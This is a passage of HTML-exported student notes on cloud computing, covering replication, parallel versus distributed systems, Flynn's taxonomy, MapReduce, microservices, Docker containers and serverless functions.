id="1211a926-7344-807c-bb30-ff9f0c5037ba" class="bulleted-list"><li style="list-style-type:disc">masks failures: doesn’t increase reliably of individual AMIs but the system as a whole</li></ul><h3 id="1211a926-7344-800f-907d-d66df3bac047" class="">Example</h3><p id="1211a926-7344-80fa-b1cf-f935314e9885" class="">the instance a user connects to is determined by which replica is healthy</p><p id="1211a926-7344-8033-8448-fa72c78af958" class="">when one replica is unhealthy, make a new replica</p><figure id="1211a926-7344-801f-80f5-e081c3694f2a" class="image"><a href="image%2057.png"><img style="width:624px" src="image%2057.png"/></a></figure><figure id="1211a926-7344-80e1-b1f5-fbfe326f3cef" class="image"><a href="image%2058.png"><img style="width:624px" src="image%2058.png"/></a></figure><figure id="1211a926-7344-80af-8907-f35454675f06" class="image"><a href="image%2059.png"><img style="width:624px" src="image%2059.png"/></a></figure></details></li></ul><ul id="1211a926-7344-8011-9307-e71761b53ac0" class="toggle"><li><details><summary>Distributed Problem</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80fd-945e-dddee7113eef"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="621bd8d4-2c79-46f2-ac9e-dba8710ee8fa" class="">cloud being a modern distributed system allows us to scale horizontally </p><p id="1211a926-7344-806a-8789-d4af94128c21" class="">cloud can solve distributing problems eg: naturally/embarrassingly parallel problem</p></div></figure><h3 id="1211a926-7344-80e8-9693-e983ea44e805" class="">Embarrassingly Parallel Problem: Rendering</h3><figure id="1211a926-7344-808b-a5cf-eaa7aab1a91b" class="image"><a href="image%2060.png"><img style="width:624px" src="image%2060.png"/></a></figure><figure id="1211a926-7344-80a5-afc7-efc9d2f4af33" class="image"><a href="image%2061.png"><img style="width:624px" src="image%2061.png"/></a></figure></details></li></ul></details></li></ul><ul id="11e1a926-7344-80fa-aedc-cdffab9a5eb4" class="toggle"><li><details><summary>Parallelism &amp; Distributed Programming </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80c2-85f2-eca5cf7e24a1"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="95b9f00a-965a-4dcd-a525-f1fce8ca31a7" class="">parallel computing process data horizontally</p><ul id="1211a926-7344-8013-9340-d258226682c5" class="bulleted-list"><li style="list-style-type:disc">cloud computing is a distributed system: communicates between other computers on a network</li></ul><ul id="1211a926-7344-807a-b22d-c77de592af61" class="bulleted-list"><li style="list-style-type:disc">cloud solves distributed problems such as parallelism</li></ul><ul id="1211a926-7344-8092-895b-f7d78a70c7e3" class="bulleted-list"><li style="list-style-type:disc">parallel and distributed computing are similar, with the key difference being that parallel systems have shared state/memory and synchronized clocks, while distributed systems process data independently on separate nodes. </li></ul><ul id="1211a926-7344-80c4-8add-cc9002e9dc37" class="bulleted-list"><li style="list-style-type:disc">parallelism is achieved by scaling horizontally: add more VMs, join them together in a network, use GPUs</li></ul><figure id="1211a926-7344-80d5-8e10-c2e0556367c7" class="image"><a href="image%2062.png"><img style="width:561.96875px" src="image%2062.png"/></a></figure><ul id="1211a926-7344-80d0-95f7-e31353eb0ed2" class="toggle"><li><details><summary><del>Distributed Systems</del></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-802c-aa0d-e9d70b90507a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="67fcfff6-f217-48e6-b22f-fcfde233d476" class="">cloud computing is a modern distributed system</p><ul id="1211a926-7344-80eb-a45e-ef14f6b8b52e" class="bulleted-list"><li style="list-style-type:disc">has concurrent elements</li></ul><ul id="1211a926-7344-80c0-8933-e311ecdde9da" class="bulleted-list"><li style="list-style-type:disc">communicates between other computers on a network</li></ul><ul id="1211a926-7344-8008-902c-ffc22c2288aa" class="bulleted-list"><li style="list-style-type:disc">can survive partial failures (replication masking)</li></ul><ul id="1211a926-7344-80f0-a750-e32a641a9a70" class="bulleted-list"><li style="list-style-type:disc">horizontal scaling </li></ul><ul id="1211a926-7344-801a-92ad-d88e1fabf9a1" class="bulleted-list"><li style="list-style-type:disc">loosely coupled: no shared clock or memory</li></ul><ul id="1211a926-7344-80d9-9168-eaeee27bbd3f" class="bulleted-list"><li style="list-style-type:disc">we want to hide the fact resources are distributed across a network</li></ul><figure id="1211a926-7344-800d-9c94-f4590c175c7b" class="image"><a href="image%2063.png"><img style="width:623.96875px" src="image%2063.png"/></a></figure></div></figure></details></li></ul><ul id="1211a926-7344-8083-8d4e-d2f89046e6e0" class="toggle"><li><details><summary><del>Parallel Computing </del></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80e1-b3ed-c3407bb170b0"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="b39d4e95-cb8f-4796-a950-e639f35c4ca2" class="bulleted-list"><li style="list-style-type:disc">distributed computing enables loosely coupled parallelism</li></ul><ul id="1211a926-7344-8003-b9f5-ccf858ebf648" class="bulleted-list"><li style="list-style-type:disc">Tightly coupled processing of data</li></ul><ul id="1211a926-7344-8004-9141-f6ed04bb42b2" class="bulleted-list"><li style="list-style-type:disc">Many CPUs in a single computer</li></ul><ul id="1211a926-7344-80de-8749-ded7d7c513f1" class="bulleted-list"><li style="list-style-type:disc">GPUs</li></ul></div></figure></details></li></ul><ul id="1211a926-7344-80cc-a972-c0ab03599dd6" class="toggle"><li><details><summary><del>Distributed vs Parallel</del></summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-8096-8d6a-c87444109912"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="0f7acf9c-0bae-44de-a9de-a2b4d5327dc1" class="">very similar, parallel has shared state and clocks, distributed is all different</p><figure id="1211a926-7344-8072-9902-fc67916ee409" class="image"><a href="image%2064.png"><img style="width:623.984375px" src="image%2064.png"/></a></figure></div></figure></details></li></ul></div></figure><ul id="1211a926-7344-80d3-b767-d05f3fdff9a8" class="toggle"><li><details><summary>Flynn Taxonomy</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80d1-9143-c5e75dfcc446"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><figure id="1211a926-7344-80d1-b586-dc97a4b0249c" class="image"><a href="c211e99c-b02b-422c-a27d-26a7bad9f440.png"><img style="width:425.51351351351354px" src="c211e99c-b02b-422c-a27d-26a7bad9f440.png"/></a></figure><ul id="1211a926-7344-80dd-8d73-eb28dd296417" class="bulleted-list"><li style="list-style-type:disc">Single Instruction : Single Data<ul id="1211a926-7344-8035-b570-c2bce6fd0bef" class="bulleted-list"><li style="list-style-type:circle">for each loop in an array, do something on each element sequentially </li></ul><figure id="1211a926-7344-8018-99c8-eddfd0aca9d8" class="image"><a href="image%2065.png"><img style="width:440.9516906738281px" src="image%2065.png"/></a></figure></li></ul><ul id="1211a926-7344-80e3-ba62-d4d10a836b9c" class="bulleted-list"><li style="list-style-type:disc">Single Instruction : Multiple Data<ul id="1211a926-7344-80fd-9ed9-d681a087c506" class="bulleted-list"><li style="list-style-type:circle">for each loop at multiple arrays at once, do the same instruction<figure id="1211a926-7344-80ee-ba1e-c1c89002a082" class="image"><a href="8f655670-f331-48cf-a106-9f911dea0628.png"><img style="width:419.11504424778764px" src="8f655670-f331-48cf-a106-9f911dea0628.png"/></a><figcaption>1 core per element</figcaption></figure></li></ul><ul id="1211a926-7344-80ec-807d-d63e0fad9c93" class="bulleted-list"><li style="list-style-type:circle">GPUs are SIMD which fake MIMD by bundling together threads and subdividing <ul id="1211a926-7344-8069-a473-fb38bd44bbc5" class="bulleted-list"><li style="list-style-type:square">not all cores are computing the same instruction at the same time</li></ul><figure id="1211a926-7344-8060-bf5f-e3da3d989ce8" class="image"><a href="image%2066.png"><img style="width:619.9715576171875px" src="image%2066.png"/></a></figure></li></ul></li></ul><ul id="1211a926-7344-8027-9ba2-c2d4a52fbc12" class="bulleted-list"><li style="list-style-type:disc">Multi Instruction : Multi Data<p id="1211a926-7344-8046-a034-f531cbfe4bc9" class="">multiple for each loops with different instructions on multiple arrays at once</p><figure id="1211a926-7344-80f3-8b0e-df59926be6fe" class="image"><a href="d8ee618c-ffa0-4e8f-a9d6-d06d4532e21d.png"><img style="width:289.5609756097561px" src="d8ee618c-ffa0-4e8f-a9d6-d06d4532e21d.png"/></a></figure></li></ul><p id="1211a926-7344-80db-bb75-eeffaa468c24" class=""><div class="indented"><p id="1211a926-7344-8036-a7a1-d28020b8e8b4" class="">
</p></div></p></div></figure></details></li></ul><ul id="1211a926-7344-808b-9f22-d1f0983a87b6" class="toggle"><li><details><summary>Parallel/Distributed Programming is hard (Amdahl’s Law &amp; Race Conditions)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80b7-bfb5-e7b045afbc77"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><ul id="85e2a831-cc4d-4a2a-8674-7de8a835331e" class="bulleted-list"><li style="list-style-type:disc">multicore hardware and parallelism now is common</li></ul><ul id="1211a926-7344-809b-aa15-d7a3f76d2854" class="bulleted-list"><li style="list-style-type:disc">we do a bad job of programming with it</li></ul><ul id="1211a926-7344-801c-8a16-c6334936bd8d" class="bulleted-list"><li style="list-style-type:disc">we can identify opportunities for parallelism with obviously parallel problems: but not all problems are obvious</li></ul><ul id="1211a926-7344-807d-bc3c-e069a9ca1a7b" class="bulleted-list"><li style="list-style-type:disc">parallel computing is supported by good compiles but we need more tools</li></ul></div></figure><h3 id="1211a926-7344-8087-a4c7-e6217ccb798e" class="">Amdahl’s Law</h3><p id="1211a926-7344-80f8-afbb-c3c71da654c0" class="">outdated idea of the benefit gain of turning something parallel gives diminishing returns by assuming everything is at some level inherently sequential: more embarrassingly parallel problems have came since then</p><h3 id="1211a926-7344-80ff-8bd2-ffdb47d69070" class="">Race Condition</h3><p id="1211a926-7344-80ea-9ad9-dddd9b4a113a" class="">output of a program/function depends on which one of two things happening independently finishes first</p><ul id="1211a926-7344-801a-81a5-ce955bad92e5" class="bulleted-list"><li style="list-style-type:disc">you don’t know which one is going to finish first, so you don’t know the output of the program</li></ul><ul id="1211a926-7344-807b-8e45-e053a312a97c" class="bulleted-list"><li style="list-style-type:disc">often happens in parallelism </li></ul></details></li></ul><p id="1211a926-7344-80bb-9527-fb1faec445b9" class=""><div class="indented"><p id="1211a926-7344-80db-a6a2-fbfa4b84404b" class="">
</p></div></p></details></li></ul><ul id="11e1a926-7344-80cd-9365-efa2e981dd6d" class="toggle"><li><details><summary>Platform as a Service (PaaS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80e3-ba9b-ebb1ec58571c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="dad61ba2-05e2-4f98-a142-c9cdf43fdac5" class="">platform/environment for deploying applications/algorithms without worrying about designing the underlying distributed system</p><ul id="1211a926-7344-80ea-8c14-db8e8413c773" class="bulleted-list"><li style="list-style-type:disc">a framework that handles performance, workload distribution, reliability, fault tolerance, general coordination and result aggregation</li></ul><ul id="1211a926-7344-8033-aa1f-c541b0cb5727" class="bulleted-list"><li style="list-style-type:disc">eg: we can make a map reduce algorithm and not worry about these things</li></ul><figure id="1211a926-7344-8039-8c36-d504073fc275" class="image"><a href="image%2067.png"><img style="width:126.97442626953125px" src="image%2067.png"/></a></figure><figure id="1211a926-7344-8040-a6b7-cd28a58cc568" class="image"><a href="image%2068.png"><img style="width:623.984375px" src="image%2068.png"/></a></figure></div></figure><h1 id="1261a926-7344-8098-a3b2-fce7e1db4127" class="">Map Reduce</h1><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-8015-aff5-ed18d73ffd90"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="460af6ec-a0f4-42a4-b607-87971f4a119e" class="">programming model/algorithm that <mark class="highlight-yellow">splits embracingly parallel data</mark> to <mark class="highlight-yellow">compute partitions </mark>on separate nodes and <mark class="highlight-yellow">merge them back together</mark> </p><ul id="1211a926-7344-8039-88ff-f41a332595f1" class="bulleted-list"><li style="list-style-type:disc">user specifies the computation in terms of map and reduce functions<ul id="1211a926-7344-8061-a3a0-cba38c3ea42b" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow">map function</mark> produces key-value pairs from data</li></ul><ul id="1211a926-7344-80f3-9d22-ccd3ec425976" class="bulleted-list"><li style="list-style-type:circle"><mark class="highlight-yellow">reduce function</mark> aggregates pairs according to some criteria</li></ul></li></ul><ul id="1211a926-7344-802c-ab70-d198c01e1b2d" class="bulleted-list"><li style="list-style-type:disc">only works on <mark class="highlight-yellow">structured and independent data</mark></li></ul><ul id="1211a926-7344-8033-bc5b-c3796a0cc2ff" class="bulleted-list"><li style="list-style-type:disc">data has to represent our Map Reduce phase</li></ul><ul id="1211a926-7344-807e-b2d5-f5cdaa988d7b" class="bulleted-list"><li style="list-style-type:disc">ideally resulting tree is wide across data with shallow number of phases: <mark class="highlight-default">more phases the more sequential </mark></li></ul></div></figure><h3 id="1211a926-7344-80cf-87d3-db4c7c017488" class="">Example</h3><blockquote id="1261a926-7344-8059-826b-fb90b31bd999" class="">we have a document of words, we want to count number of times a word appears </blockquote><ol type="1" id="1211a926-7344-800e-a424-c47daaeb8f4e" class="numbered-list" start="1"><li><mark class="highlight-yellow">map </mark>data <mark class="highlight-yellow">to key value pairs</mark> (word : count)<figure id="1211a926-7344-80be-9522-f90d68738930" class="image"><a href="image%2069.png"><img style="width:378.9772644042969px" src="image%2069.png"/></a></figure></li></ol><ol type="1" id="1211a926-7344-809b-8109-d0f092c7a085" class="numbered-list" start="2"><li>keys are <mark class="highlight-yellow">sorted </mark>sequentially: human readability  <figure id="1211a926-7344-8005-9142-c6e335888c6a" class="image"><a href="image%2070.png"><img style="width:355.9801025390625px" src="image%2070.png"/></a></figure></li></ol><ol type="1" id="1211a926-7344-806e-93db-e55ae780aa9f" class="numbered-list" start="3"><li><mark class="highlight-yellow">reduce duplicates by merging</mark> equivalent keys and adding their values then collect everything<figure id="1211a926-7344-803a-a2f1-f8c44fc82260" class="image"><a href="image%2071.png"><img style="width:576px" src="image%2071.png"/></a></figure></li></ol></details></li></ul><ul id="11e1a926-7344-80f2-a062-fc9e05e6c325" class="toggle"><li><details><summary>Serverless Computing &amp; Microservices</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-800e-8376-e1c8d38d5f3a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="dc4ce139-bfbc-4161-afc1-fb30d6202e2b" class="">service provider/platform hides the server from the programmer, allowing you to simply focus on the application </p><ul id="1211a926-7344-8015-948f-dd6a0937daf0" class="bulleted-list"><li style="list-style-type:disc">separation from the server and application </li></ul><ul id="1211a926-7344-8039-920f-ce22c21e0f6a" class="bulleted-list"><li style="list-style-type:disc">provider handles servers, clustering, scaling, connectivity for you</li></ul><ul id="1211a926-7344-801d-9009-eac40909fa37" class="bulleted-list"><li style="list-style-type:disc">containers can be serverless, functions are inherently serverless </li></ul><ul id="1211a926-7344-808e-b4eb-f7c83c375793" class="bulleted-list"><li style="list-style-type:disc">Clusters are container instances: used on ECS and Fargate</li></ul><ul id="1211a926-7344-8007-90f7-eb3283515378" class="bulleted-list"><li style="list-style-type:disc">easy to/automatically scale</li></ul><ul id="1211a926-7344-80ae-b504-e4ce3f931fc9" class="bulleted-list"><li style="list-style-type:disc">loss of server control</li></ul><ul id="1211a926-7344-8050-80e0-db5394bbc0ae" class="bulleted-list"><li style="list-style-type:disc">serverless can be more expensive</li></ul></div></figure><ul id="1211a926-7344-803c-9342-c01933d16f65" class="toggle"><li><details><summary>Monolithic vs Modular Applications</summary><h3 id="1211a926-7344-807d-a5f9-e7f9d25efa22" class="">Monolithic vs Modular Applications</h3><ul id="1211a926-7344-80b9-9ed9-c55760c01b28" class="bulleted-list"><li style="list-style-type:disc">monolith has everything together<figure id="1211a926-7344-80b7-9c01-e48ef1a62430" class="image"><a href="image%2072.png"><img style="width:642.9971313476562px" src="image%2072.png"/></a></figure></li></ul><ul id="1211a926-7344-80ce-b34a-e3f1c17a375c" class="bulleted-list"><li style="list-style-type:disc">modular allows you to pick and choose<figure id="1211a926-7344-8015-a2cb-fb09addaee73" class="image"><a href="image%2073.png"><img style="width:624.07666015625px" src="image%2073.png"/></a></figure></li></ul><ul id="1211a926-7344-807d-a9d0-ce7d58ca75d4" class="bulleted-list"><li style="list-style-type:disc">monolithic/vertical scaling makes sense for small applications <figure id="1211a926-7344-8012-8196-cf340ac0162a" class="image"><a href="image%2074.png"><img style="width:192px" src="image%2074.png"/></a></figure></li></ul><ul id="1211a926-7344-80fa-a579-dfc6e868184e" class="bulleted-list"><li style="list-style-type:disc">Monolithic applications scale poorly horizontally due to dependencies in larger software. Duplicating everything increases the complexity of these dependencies.<figure id="1211a926-7344-808e-9ee4-fbffe20fa357" class="image"><a href="image%2075.png"><img style="width:624.0625px" src="image%2075.png"/></a></figure></li></ul></details></li></ul><ul id="1211a926-7344-8063-9f48-cf2497f13382" class="toggle"><li><details><summary>Microservices</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-804c-b67c-ee23ca6e0993"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="eda3ca22-7686-490e-8e2d-39bdeb916936" class="">modular services that can be wired together to make up a larger application</p><figure id="1211a926-7344-8031-ac04-fe040f1451d1" class="image"><a href="image%2076.png"><img style="width:562.272705078125px" src="image%2076.png"/></a></figure><ul id="1211a926-7344-8074-8320-e325c8c119ad" class="bulleted-list"><li style="list-style-type:disc">multiple single responsibility, independently managed software units with a clear scope</li></ul><ul id="1211a926-7344-8080-b663-e9fd07814328" class="bulleted-list"><li style="list-style-type:disc">scales better horizontally: just replicating the parts you want, not the whole app</li></ul><ul id="1211a926-7344-807c-8f99-d7dd2fbd8bcf" class="bulleted-list"><li style="list-style-type:disc">microservices &amp; serverless don’t replace monolithic systems: they’re just another way of reasoning/architecting for scale</li></ul></div></figure></details></li></ul><p id="1211a926-7344-80da-97ff-cb2261ba2baf" class="">
</p></details></li></ul><ul id="11e1a926-7344-80fb-a1f9-e0d9a1f5ecbb" class="toggle"><li><details><summary>Containers as a service (CaaS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1211a926-7344-80d4-b7e4-dd9154c32db9"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="635ac5ce-f709-4c6e-bebb-09d5c7bb7d02" class="">provides an environment to easily deploy container virtualization </p><ul id="1221a926-7344-80b1-8539-edd59387b03d" class="bulleted-list"><li style="list-style-type:disc">provider handles underlying computer resources as a container engine</li></ul></div></figure><ul id="1211a926-7344-8044-8399-da1d5f481ac7" class="toggle"><li><details><summary>Containers</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-803e-b28b-c56f077056bd"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="eed1cd4f-3aea-4ec3-8d89-aae56bf242af" class="">containerizing software gives a standard to be deployed anywhere</p><ul id="1221a926-7344-80e3-8ca3-de8f73ead02e" class="bulleted-list"><li style="list-style-type:disc">allows software to be easily packaged for serverless</li></ul><ul id="1221a926-7344-809c-87d1-f981993fe6af" class="bulleted-list"><li style="list-style-type:disc">clean, safe, portable runtime environment for your apps</li></ul><ul id="1221a926-7344-8079-9f63-d4e4d065a43c" class="bulleted-list"><li style="list-style-type:disc">no need to worry about dependencies, upgrade, package management during deployment</li></ul><ul id="1221a926-7344-80e4-8dfb-f4912d7b23ea" class="bulleted-list"><li style="list-style-type:disc">runs each app in its own isolated container</li></ul><ul id="1221a926-7344-8017-b779-e0056efc325f" class="bulleted-list"><li style="list-style-type:disc">build once, run anywhere</li></ul><ul id="1221a926-7344-807f-ae22-d23fe4dbed52" class="bulleted-list"><li style="list-style-type:disc">if it works locally (in a container) it’ll work on a server</li></ul><figure id="1211a926-7344-8043-8e2e-e5a6e9e4794c" class="image"><a href="image%2077.png"><img style="width:623.984375px" src="image%2077.png"/></a></figure></div></figure><h3 id="1211a926-7344-8090-bf97-ddb4773de350" class="">Docker Containers</h3><p id="1221a926-7344-809a-9030-dd39d011bb05" class="">a packaging standard for software and dependencies</p><ul id="1221a926-7344-80e5-b7c1-e179521a4643" class="bulleted-list"><li style="list-style-type:disc">isolates apps from others</li></ul><ul id="1221a926-7344-8075-b5f7-fbc3b5aa856e" class="bulleted-list"><li style="list-style-type:disc">shares the same kernel </li></ul><figure id="1221a926-7344-803e-a463-e7fb686ec539" class="image"><a href="8be89794-90fc-4c20-914b-0c9ea0c1abf8.png"><img style="width:288px" src="8be89794-90fc-4c20-914b-0c9ea0c1abf8.png"/></a></figure><h3 id="1221a926-7344-80b7-a868-e4e99e8c6c71" class="">Containers vs VMs</h3><p id="1221a926-7344-80f4-8ba0-e92c5a0a28e5" class="">both are used to isolate and deploy portable software but have fundamentally different architectures and offer distinct benefits</p><ul id="1221a926-7344-800a-8bcb-fbc08b124f32" class="bulleted-list"><li style="list-style-type:disc">unlike VMs, containers share OS for faster deployment and less overhead</li></ul><ul id="1221a926-7344-8025-bda9-f5c4a8500f08" class="bulleted-list"><li style="list-style-type:disc">containers are faster and lighter than VMs</li></ul><ul id="1221a926-7344-8036-aea3-e1b4b9e6eabd" class="bulleted-list"><li style="list-style-type:disc">but less isolate, flexibility, management/control and worse for legacy apps</li></ul><figure id="1221a926-7344-80e5-9846-cab55e957000" class="image"><a href="23ec5e9c-a0a1-41e7-bb03-d0b13f6b08f2.png"><img style="width:634.4347826086956px" src="23ec5e9c-a0a1-41e7-bb03-d0b13f6b08f2.png"/></a></figure><h3 id="1221a926-7344-8007-ac9a-da3ab0307de1" class="">Isolation</h3><figure id="1221a926-7344-80cc-b79f-fd016440dc06" class="image"><a href="image%2078.png"><img style="width:623.984375px" src="image%2078.png"/></a></figure><h3 id="1221a926-7344-8047-994f-f2c1670437cf" class="">Lightweight</h3><p id="1221a926-7344-80ab-a199-d5ad52b240d2" class="">containers are light weight due to only storing the app and dependences, not the OS</p><p id="1221a926-7344-80fb-b5e1-d7acc7485ef1" class="">modoficiatons to the image (changes and updates) are stored indepdently rather than making a whole new copy</p><figure id="1221a926-7344-800c-858a-fefea57b3b29" class="image"><a href="image%2079.png"><img style="width:623.984375px" src="image%2079.png"/></a></figure><ul id="1221a926-7344-80e5-a264-e750b059192f" class="bulleted-list"><li style="list-style-type:disc">repo only needs to store the differences in changes rather than whole copies when small things change</li></ul><ul id="1221a926-7344-8003-81b8-e127002f0a49" class="bulleted-list"><li style="list-style-type:disc">delta is the dif, app A prime is the new container, A is the og</li></ul><figure id="1221a926-7344-8061-99fc-f9fed94e2044" class="image"><a href="image%2080.png"><img style="width:623.96875px" src="image%2080.png"/></a></figure><p id="1211a926-7344-80d3-b7a7-fb865ff48efa" class="">
</p></details></li></ul><ul id="1211a926-7344-80ca-bce8-f25adb91bdf2" class="toggle"><li><details><summary>Image Registries</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-80fb-bc75-ccfd4812d80a"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="9ef4dae0-1dc3-4274-a1c2-2371cba63117" class="">repositories to store docker images </p><ul id="1221a926-7344-80d3-9cf3-e64780d5b9c6" class="bulleted-list"><li style="list-style-type:disc">DockerHub is a globally shared repo, local registry is on the dev machine</li></ul><ul id="1221a926-7344-80d6-8423-c0eb6e4dc9ca" class="bulleted-list"><li style="list-style-type:disc">used to upload and deploy from the containers from the registry</li></ul></div></figure></details></li></ul><ul id="1211a926-7344-8082-b606-c7cac58e0f59" class="toggle"><li><details><summary>Docker Images</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1221a926-7344-8088-9735-e06e174fe70e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="511a5013-edd8-4f40-9411-a0348526a028" class="">images are the template to create containers (like AMI, code)</p><p id="1221a926-7344-8029-9d1b-f4e3d4d9feca" class="">containers are images in execution (like instances, process in runtime)</p><ul id="1221a926-7344-80e3-9d01-d7ea0b70bb8e" class="bulleted-list"><li style="list-style-type:disc">docker images are wrappers around an OS</li></ul></div></figure><h3 id="1221a926-7344-80da-a95b-f4bada8a1d66" class="">Making Docker Images</h3><p id="1221a926-7344-803f-b3f5-d1d0fe2b7cdb" class="">images are specified in docker files, each instruction adds layers of software</p><ol type="1" id="1221a926-7344-80f1-b900-d55a07ba88a2" class="numbered-list" start="1"><li>use desired base/template image: OS can be raw linux or on with stuff already installed</li></ol><ol type="1" id="1221a926-7344-8074-bde1-d4bb4fef0f13" class="numbered-list" start="2"><li>add layers: software/dependences you need (eg: install java)</li></ol><ol type="1" id="1221a926-7344-8088-aaf8-c370f09e7b8c" class="numbered-list" start="3"><li>add your software</li></ol><ol type="1" id="1221a926-7344-8065-8fc1-de5f2ed47a69" class="numbered-list" start="4"><li>new image then a base for more software</li></ol><h3 id="1221a926-7344-808a-9202-d8ecc7395cb6" class="">Docker File</h3><ul id="1221a926-7344-80f8-b6ee-cb72a98004b8" class="bulleted-list"><li style="list-style-type:disc"><code>FROM</code>: use base image</li></ul><ul id="1221a926-7344-8022-92e7-ea4c68aba876" class="bulleted-list"><li style="list-style-type:disc"><code>RUN</code>: execute command (in this case, install nodejs from pm)</li></ul><ul id="1221a926-7344-80b1-8986-da51cd44a0d4" class="bulleted-list"><li style="list-style-type:disc"><code>COPY</code>: copy files/directories from a host machine into the container (in this case, add your software into the container)</li></ul><figure id="1221a926-7344-8002-93b1-f19134290213" class="image"><a href="image%2081.png"><img style="width:615.95166015625px" src="image%2081.png"/></a></figure></details></li></ul></details></li></ul><ul id="11e1a926-7344-80f1-9ec7-e430f73c80ca" class="toggle"><li><details><summary>Functions as a service (FaaS)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1261a926-7344-806e-8f68-f3a55e0a6133"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="52919eef-d6be-4e00-bc57-39ab889cc46e" class="">form of <mark class="highlight-yellow_background">serverless computing</mark> that just <mark class="highlight-yellow_background">provides functions</mark></p><ul id="1261a926-7344-8082-adcc-ea955ac4c9cf" class="bulleted-list"><li style="list-style-type:disc">data flow programming: data is priority, functions appear to process data</li></ul><ul id="1261a926-7344-8054-9090-ceb8a0c0d50c" class="bulleted-list"><li style="list-style-type:disc">small &amp; dedicated: services are responsible for doing only 1 thing</li></ul><ul id="1261a926-7344-8035-b012-d0d6574b8d0f" class="bulleted-list"><li style="list-style-type:disc">trigger: there is no start point</li></ul><ul id="1261a926-7344-8037-ba52-ed4f93414c6f" class="bulleted-list"><li style="list-style-type:disc">stateless<ul id="1261a926-7344-8068-a4e9-e285f0ff2d09" class="bulleted-list"><li style="list-style-type:circle">allows scale: ensures code is embarrassingly parallel and easy when invocations are independent </li></ul><ul id="1261a926-7344-8037-bcee-cdfa0bf38bd3" class="bulleted-list"><li style="list-style-type:circle">fault tolerance: can rerun failed functions and can run set of functions to check for consistent answers</li></ul></li></ul></div></figure><h3 id="1261a926-7344-800e-b3a9-df2375d1d45d" class="">Functions as Micro-Services Example</h3><ul id="1261a926-7344-805d-99b7-cb7a8755c29b" class="bulleted-list"><li style="list-style-type:disc">lambda functions are<ul id="1261a926-7344-8063-b391-e58155f6230a" class="bulleted-list"><li style="list-style-type:circle">intendent</li></ul><ul id="1261a926-7344-8028-abf6-cd2c37312851" class="bulleted-list"><li style="list-style-type:circle">ephemeral</li></ul><ul id="1261a926-7344-8057-99fc-ef146e0e619e" class="bulleted-list"><li style="list-style-type:circle">stateless </li></ul></li></ul><p id="1261a926-7344-809d-83e0-d7c2df9134cf" class=""> simple use case for FaaS may be to resize an image in an S3 bucket</p><ol type="1" id="1261a926-7344-8015-b205-facded85efc4" class="numbered-list" start="1"><li>set up permission to access the bucket</li></ol><ol type="1" id="1261a926-7344-8074-8a52-fc4b33424ed7" class="numbered-list" start="2"><li>identify a trigger: user uploads an image</li></ol><ol type="1" id="1261a926-7344-809f-92bc-cd399e70d8a0" class="numbered-list" start="3"><li>write function code</li></ol><figure id="1261a926-7344-804e-a244-f6a5d82e02fe" class="image"><a href="image%2082.png"><img style="width:623.96875px" src="image%2082.png"/></a></figure><h3 id="1261a926-7344-8035-816b-d4a8ea7995d2" class="">Latency</h3><p id="1261a926-7344-80bf-a948-e57f226feb51" class="">functions are slow when having to cold start</p><p id="1261a926-7344-8008-97b6-d97a77b7b500" class="">caching can speed up recent use</p><p id="1261a926-7344-80f1-97d2-c23d668f31ff" class="">after functions are warm, they’re fast</p><figure id="1261a926-7344-8065-954d-fcecbcc6e5b9" class="image"><a href="image%2083.png"><img style="width:476px" src="image%2083.png"/></a></figure></details></li></ul><ul id="11e1a926-7344-80d4-afdf-fd51b263527b" class="toggle"><li><details><summary>Green Computing</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1261a926-7344-80a3-86de-df01df02d16c"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="d6c80365-6e94-4bfd-91af-ded7a6617703" class="">
